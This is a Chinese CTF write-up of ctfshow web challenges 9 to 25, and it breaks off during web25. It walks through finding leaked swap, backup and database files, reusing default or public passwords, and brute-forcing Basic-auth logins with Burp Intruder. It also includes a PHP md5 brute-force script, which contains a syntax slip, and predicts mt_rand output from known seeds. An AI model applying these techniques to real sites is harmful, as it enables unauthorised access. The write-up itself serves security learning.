<h4 id="git-svn-泄露"><a href="#git-svn-泄露" class="headerlink" title="git svn 泄露"></a>git svn 泄露</h4><p>​     <strong>git与svn的区别：</strong><br>1.git是分布式的，svn是集中式的<br>2.git将每个历史版本都存储完整的文件，svn只是存储差异的文件，历史版本不可恢复<br>3.git可以离线完成大部分的操作，svn不可以离线操作<br>4.git可以实现分支合并<br>5.git可以修改和撤销修改历史版本<br>6.git速度快，效率高<br>7.git有本地仓库<br>8.git以元数据方式存储，svn以原始文件存储</p>
<p>详细内容请百度：<a href="https://www.baidu.com/s?ie=utf-8&f=8&rsv_bp=1&tn=monline_3_dg&wd=git%E5%92%8Csvn&oq=git&rsv_pq=b430d72200b4dd6f&rsv_t=999c8e4eC5soN/fN57lz7fw37UWO8FFEV83oxK4Llmxk1PdSlz9Mtjcx5JkGUeJCSXoZ&rqlang=cn&rsv_dl=tb&rsv_enter=1&rsv_sug3=8&rsv_sug1=7&rsv_sug7=100&rsv_sug2=0&rsv_btype=t&inputT=5881&rsv_sug4=9087">git和svn</a></p>
<h3 id="web9"><a href="#web9" class="headerlink" title="web9"></a>web9</h3><p>官方提示：发现网页有个错别字？赶紧在生产环境vim改下，不好，死机了。</p>
<p>vim在编辑文件的时候，会有一个备份，后缀名.swp，如果突然断电，这个备份文件就会留存下来，可以被人访问到。</p>
<p>由题目中的提示可以知道，vim修改的文件并没有保存后关闭而是直接关闭，所以第一次会产生一个.&lt;文件名&gt;.php.swp文件，第二次会有一个.&lt;文件名&gt;.php.swo文件，第三次会有一个.&lt;文件名&gt;.php.swn文件。</p>
<p><img src="https://img-blog.csdnimg.cn/47bf101e57d04da187598dcc27d1fd49.png#pic_center" alt="10"></p>
<p>访问url&#x2F;index.php.swp可以下载这个文件，flag就在这里。</p>
<p>​       试着访问一下后两个文件。</p>
<h3 id="web10"><a href="#web10" class="headerlink" title="web10"></a>web10</h3><p>提示：cookie 只是一块饼干，不能存放任何隐私数据</p>
<p>还是这：</p>
<p><img src="https://img-blog.csdnimg.cn/ef469b9758f141a19ca3fddc186a24d3.png" alt="11"></p>
<p>既然有提示，我们抓包看一下cookie：<img src="https://img-blog.csdnimg.cn/439d83193a654d5bbb1e63afc6ac2b4b.png" alt="12"><br>flag到手。</p>
<h3 id="web11"><a href="#web11" class="headerlink" title="web11"></a>web11</h3><p>提示：域名其实也可以隐藏信息，比如flag.ctfshow.com 就隐藏了一条信。<br>既然说了域名隐藏信息那我们用<a href="http://dbcha.com/">dns检查查询</a><br><img src="https://img-blog.csdnimg.cn/f1d3798a100d410ab33338bcf3fad2cd.png" alt="13">在txt栏得到flag。（TXT 记录，一般指为某个主机名或域名设置的说明。）</p>
<h3 id="web12"><a href="#web12" class="headerlink" title="web12"></a>web12</h3><p>有提示：有时候网站上的公开信息，就是管理员常用密码<br>那找找密码，帮助热线号码好像密码。<img src="https://img-blog.csdnimg.cn/7f1240fdcf74469cb9d089eba6742563.png" alt="在这里插入图片描述">以管理员身份登入后台看看：<br><img src="https://img-blog.csdnimg.cn/22ac034131d54e918c466f472da1f461.png" alt="14"><br>果然，输入密码后flag显现ctfshow{c9494549-232c-4a44-af85-06574f2ed4b7}</p>
<h3 id="web13"><a href="#web13" class="headerlink" title="web13"></a>web13</h3><p>看提示：技术文档里面不要出现敏感信息，部署到生产环境后及时修改默认密码<br>看了一遍网页，发现底部有个document，点开看看：<br><img src="https://img-blog.csdnimg.cn/677b3711b60c469dbaf0f866ae4119cc.png" alt="15"><br>哈哈试试呗<br><img src="https://img-blog.csdnimg.cn/0ad9cac0edb94e54baccc03df56b8e8c.png" alt="16"></p>
<h3 id="web14"><a href="#web14" class="headerlink" title="web14"></a>web14</h3><p>提示：有时候源码里面就能不经意间泄露重要(editor)的信息,默认配置害死人<br>御剑扫描一下：<br><img src="https://img-blog.csdnimg.cn/6c8b1c4eb3ac4d29a51186d2839221eb.png" alt="17">不错，进入&#x2F;editor看看：<br><img src="https://img-blog.csdnimg.cn/0ef15f64db654755aec7a7a7c00fa38b.png" alt="18">然后点上传文件，在文件空间中按<strong>tmp&#x2F;html&#x2F;nothinghere</strong>这个路径找到fl000g.txt，确定，得到一堆路径, 前面的是编译器的绝对路径，我们访问后面的**&#x2F;nothinghere&#x2F;fl000g.txt**就可以得到flag了。</p>
<h3 id="web15"><a href="#web15" class="headerlink" title="web15"></a>web15</h3><p>提示：<strong>公开的信息比如邮箱，可能造成信息泄露，产生严重后果</strong></p>
<p>进入题目后看到有个QQ邮箱，我们搜一下它的QQ。没啥信息，返回到刚才的网站加后缀看能不能进去后台：<br><img src="https://img-blog.csdnimg.cn/da05c6a03cad4131b2f010f9538c5320.png" alt="15"><br>不知道用户名密码哎，那忘记密码吧！发现一个信息：<br><img src="https://img-blog.csdnimg.cn/f22b46a6672d4a4bb5acecc3ff05f611.png" alt="15"><br>刚才搜的QQ用户在西安，我们 试试，<img src="https://img-blog.csdnimg.cn/2b245d352a024f6aae4c1a9f4c76ccaa.png" alt="15"><br>果然不出我所料，然后返回输入密码，得到flag。</p>
<h3 id="web16"><a href="#web16" class="headerlink" title="web16"></a>web16</h3><p>提示：<strong>对于测试用的探针，使用完毕后要及时删除，可能会造成信息泄露</strong><br>啥是探针呢？搜索一下，最后看到有关于PHP探针的解释</p>
<blockquote>
<p>php探针是用来探测空间、服务器运行状况和PHP信息用的，探针可以实时查看服务器硬盘资源、内存占用、网卡流量、系统负载、服务器时间等信息。</p>
</blockquote>
<p>具体解释请点击<a href="https://baike.baidu.com/item/PHP%E6%8E%A2%E9%92%88/10922752">php探针</a>。<br><img src="https://img-blog.csdnimg.cn/20be60559dd64161aeb30a72d6de10ca.png" alt="16">我们试试**&#x2F;tz.php**<img src="https://img-blog.csdnimg.cn/25ab292735884c0f9edaf18fc619f12e.png" alt="16"><img src="https://img-blog.csdnimg.cn/38ddc1cf0aa64edca4df5cdde973a6af.png" alt="16"></p>
<p>有个PHP信息，打开看看:<img src="https://img-blog.csdnimg.cn/cd667b76d4134efdb200a483efa46f30.png" alt="16"><br>打开之后直接找关键字符“ctfshow”，得到flag。</p>
<h3 id="web17"><a href="#web17" class="headerlink" title="web17"></a>web17</h3><p>提示：<strong>备份的sql文件会泄露敏感信息</strong><br>没思路啊<img src="https://img-blog.csdnimg.cn/ba8913b0cb3f4a9b82985fa9246120ab.png" alt="17">我在网上搜了一下<strong>查看自己备份的SQL文件</strong>也不知道怎么办。但备份的英语好像是backup，看一下**&#x2F;backup.sql文件**，找到flag。</p>
<h4 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h4><p>sql文件的备份一般为<strong>backup.sql</strong></p>
<h3 id="web18"><a href="#web18" class="headerlink" title="web18"></a>web18</h3><p>提示：<strong>不要着急，休息，休息一会儿，玩101分给你flag</strong><br>我第一反应就是抓包改数据，那就试试吧！<br>抓了好几次，没用。像往常一样，看看源代码<img src="https://img-blog.csdnimg.cn/17d6f2c0470645ee9e9d2bd951f760b3.png" alt="18">点开看看：<br><img src="https://img-blog.csdnimg.cn/c113565d12794d029a997ed511c7685f.png" alt="18"><br>直接找“ctfshow”找不到，那看看有什么间接的信息。<img src="https://img-blog.csdnimg.cn/6e200f592d7c46c794731761f8662f69.png" alt="18">好像有线索，是某种类型的编码，尝试解一下。<br><img src="https://img-blog.csdnimg.cn/51a0c388d55b4cb6896c98cfbecab8bb.png" alt="18"><br>去110.php看看,出现flag。</p>
<h3 id="web19"><a href="#web19" class="headerlink" title="web19"></a>web19</h3><p>提示：<strong>密钥什么的，就不要放在前端了</strong><br><img src="https://img-blog.csdnimg.cn/e438c4cc7a9f4e98ba0cbd0220c26d37.png" alt="19">是用post传入的，<br><img src="https://img-blog.csdnimg.cn/103ae3bb049e418e98478720a13f1862.png" alt="19"><br>得到flag。</p>
<h4 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h4><p>第一反应看到有账号密码时我就直接输入了，那肯定是错误的，因为我没有仔细看题意。错了之后才知道是post传参。<br><strong>反省：一定要仔细审代码，这关乎着成败。</strong></p>
<h3 id="web20"><a href="#web20" class="headerlink" title="web20"></a>web20</h3><blockquote>
<p>提示：mdb文件是早期asp+access构架的数据库文件，文件泄露相当于数据库被脱裤了。</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/41c86488b14649d38f44842262868a26.png" alt="20"></p>
<p>asp+access最大的安全隐患在于access数据库可以被别人下载。<br>mdb文件是早期asp+access构架的数据库文件 直接查看url路径添加&#x2F;db&#x2F;db.mdb 下载文件通过txt打开或者通过EasyAccess.exe打开搜索flag</p>
<h4 id="ACCESS数据库的隐患"><a href="#ACCESS数据库的隐患" class="headerlink" title="ACCESS数据库的隐患"></a>ACCESS数据库的隐患</h4><h5 id="Access数据库的存储隐患"><a href="#Access数据库的存储隐患" class="headerlink" title="Access数据库的存储隐患"></a>Access数据库的存储隐患</h5><p>在ASP＋Access应用系统中，如果获得或者猜到Access数据库的存储路径和数据库名，则该数据库就可以被下载到本地。</p>
<h5 id="Access数据库的解密隐患"><a href="#Access数据库的解密隐患" class="headerlink" title="Access数据库的解密隐患"></a>Access数据库的解密隐患</h5><p>由于Access数据库的加密机制非常简单，所以即使数据库设置了密码，解密也很容易。该数据库系统通过将用户输入的密码与某一固定密钥进行异或来形成一个加密串，并将其存储在＊.mdb文件中从地址“＆H42”开始的区域内。由于异或操作的特点是“经过两次异或就恢复原值”，因此，用这一密钥与＊.mdb文件中的加密串进行第二次异或操作，就可以轻松地得到Access数据库的密码。基于这种原理，可以很容易地编制出解密程序。</p>
<h5 id="程序设计中的安全隐患"><a href="#程序设计中的安全隐患" class="headerlink" title="程序设计中的安全隐患"></a>程序设计中的安全隐患</h5><p>ASP代码利用表单（form）实现与用户交互的功能，而相应的内容会反映在浏览器的地址栏中，如果不采用适当的安全措施，只要记下这些内容，就可以绕过验证直接进入某一页面。例如在浏览器中敲入“…… page.asp?x&#x3D;1”，即可不经过表单页面直接进入满足“x&#x3D;1”条件的页面。因此，在设计验证或注册页面时，必须采取特殊措施来避免此类问题的发生。 </p>
<h4 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h4><p>自己在网上搜索</p>
<h2 id="爆破篇"><a href="#爆破篇" class="headerlink" title="爆破篇"></a>爆破篇</h2><h3 id="web21"><a href="#web21" class="headerlink" title="web21"></a>web21</h3><p>提示：<strong>爆破什么的，都是基操</strong><br><img src="https://img-blog.csdnimg.cn/50dec98ecd16438d95781995e710e7a3.png" alt="21"><br>给了一个字典文件，保存一下要用到。<br>打开链接后让我们输入账号密码，明显需要用bp抓包。<img src="https://img-blog.csdnimg.cn/2c342a9ab4b943a199bcd52181f7d1c2.png" alt="21"><br>被加密了，base64解密后得到<strong>用户:密码</strong><img src="https://img-blog.csdnimg.cn/dbf26459f49b4fb0bee29e0f9db2aed4.png" alt="21">OK，我们sent to intruder<img src="https://img-blog.csdnimg.cn/612dc5429f6449928acd8dbb5fb6e1c4.png" alt="21">设置好要爆破的内容，切换到payloads页面<img src="https://img-blog.csdnimg.cn/944254253a544554ac2bc595ad056408.png" alt="21"><br>添加第一部分：用户名<img src="https://img-blog.csdnimg.cn/df3fba6b116e4dac8fb8bbd36de533ee.png" alt="21"><br>添加第二部分：**:**（英文状态下）<img src="https://img-blog.csdnimg.cn/81b9ffed5f5a44618a64d6214facd8d4.png" alt="21">添加第三部分：密码，用刚才下载的文件字典。</p>
<p><img src="https://img-blog.csdnimg.cn/007a60a2824640ac90862574538a5351.png" alt="21">别忘了再编码，因为抓包时用户密码被加密了。<br><img src="https://img-blog.csdnimg.cn/fe997425d5384d519b2a115c77240b45.png" alt="21"><br>取消勾选<img src="https://img-blog.csdnimg.cn/3d0bcebe5ac64f0bb317a4d11aa12ade.png" alt="21"><br>开始爆破，<img src="https://img-blog.csdnimg.cn/da957508a007461b85eef29e440333e9.png" alt="21">得到密码，然后再base64解码，得到用户密码，输入之后便可得到flag。<img src="https://img-blog.csdnimg.cn/eeb4c1d85335439da11f57fd4d455aac.png" alt="21"></p>
<h4 id="思路："><a href="#思路：" class="headerlink" title="思路："></a>思路：</h4><p>抓包后是得到加密后的用户密码，然后解密后看到用户密码被加工了。将数据发送到爆破模块，选中base64编码后的用户名和密码。选择payloads，设置为custom iterator(自定义迭代器)<strong>自定义迭代器可以自定义拼接方式</strong> position的位置即为我们的拼接方式，根据上述base64解码的tomcat密码的格式：用户名:密码 —–&gt;则position的位数为3。3个拼接完成后，需要进行base64编码；<strong>payload processing</strong> 进行编码设置。取消Palyload Encoding编码。然后爆破成功！</p>
<h3 id="web22"><a href="#web22" class="headerlink" title="web22"></a>web22</h3><p>提示：<strong>域名也可以爆破的，试试爆破这个ctf.show的子域名</strong></p>
<p><a href="https://phpinfo.me/domain">查询一下他的子域名</a>，最后在<strong>vip.ctf.show</strong>的源代码中看到了flag。<img src="https://img-blog.csdnimg.cn/3dfd59da05a249dd989cea14e7f0d166.png" alt="22"></p>
<h3 id="web23"><a href="#web23" class="headerlink" title="web23"></a>web23</h3><p><strong>提示：还爆破？这么多代码，告辞！</strong><br>好像没什么卵用。往下看：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token comment">/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-03 11:43:51
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-03 11:56:11
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'token'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$token</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'token'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$token</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$token</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$token</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">===</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$token</span><span class="token punctuation">,</span> <span class="token number">17</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$token</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$token</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$token</span><span class="token punctuation">,</span> <span class="token number">17</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$token</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$token</span><span class="token punctuation">,</span> <span class="token number">31</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token punctuation">&#125;</span>
<span class="token delimiter important">?></span></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>分析一下代码：<br>如果存在一个token值，且token值是被md5加密过的，如果if中的条件满足，则打印出flag。需要传递一个 token值，写脚本爆破，在这里我用PHP语言，脚本如下：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">&lt;=</span><span class="token number">10000</span><span class="token punctuation">:</span><span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
   <span class="token variable">$token</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$token</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$token</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$token</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">===</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$token</span><span class="token punctuation">,</span> <span class="token number">17</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$token</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$token</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$token</span><span class="token punctuation">,</span> <span class="token number">17</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$token</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$token</span><span class="token punctuation">,</span> <span class="token number">31</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token keyword">echo</span> <span class="token variable">$i</span><span class="token operator">.</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>思路是因为token存在一个整数值，但现在不知道是多少，我假设是在10000之内，运行一下，得到<strong>422和1202</strong>然后在url后加上 <strong>?token&#x3D;1202</strong> 或 <strong>?token&#x3D;422</strong> 回车后得到flag。<br><strong>我认为以后会有很多题要用脚本。</strong> 比如python是一个很好的选择。</p>
<h3 id="web24"><a href="#web24" class="headerlink" title="web24"></a>web24</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token comment">/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-03 13:26:39
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-03 13:53:31
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/</span>

<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'r'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$r</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'r'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token function">mt_srand</span><span class="token punctuation">(</span><span class="token number">372619038</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$r</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">echo</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'cat /proc/version'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token delimiter important">?></span></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>mt_srand通过seed给mt_rand播种，然后mt_rand通过<a href="https://baike.baidu.com/item/%E6%A2%85%E6%A3%AE%E6%97%8B%E8%BD%AC%E7%AE%97%E6%B3%95/22800014">梅森旋转算法</a>生成伪随机数。如果指定seed，那么mt_srand播出来的种子是固定的，mt_rand生成的伪随机数也是固定的：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">mt_srand</span><span class="token punctuation">(</span><span class="token number">372619038</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="https://img-blog.csdnimg.cn/10e71b69aefc4ce6af505059950068dd.png" alt="24"><br>get传参传入?r&#x3D;1122388967,得到flag.</p>
<h3 id="web25"><a href="#web25" class="headerlink" title="web25"></a>web25</h3><p>打开后有以下代码</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token comment">/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-03 13:56:57
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-03 15:47:33
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/</span>


<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'r'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$r</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'r'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token function">mt_srand</span><span class="token punctuation">(</span><span class="token function">hexdec</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$rand</span> <span class="token operator">=</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$r</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$rand</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'token'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token punctuation">(</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">echo</span> <span class="token variable">$rand</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">echo</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'cat /proc/version'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span> </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>mt_scrand(seed)这个函数的意思，是通过分发seed种子，然后种子有了后，靠mt_rand()生成随机数。<br>这里没有明确给出seed，因此我们需要用工具逆推出seed。</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$rand</span> <span class="token operator">=</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$r</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

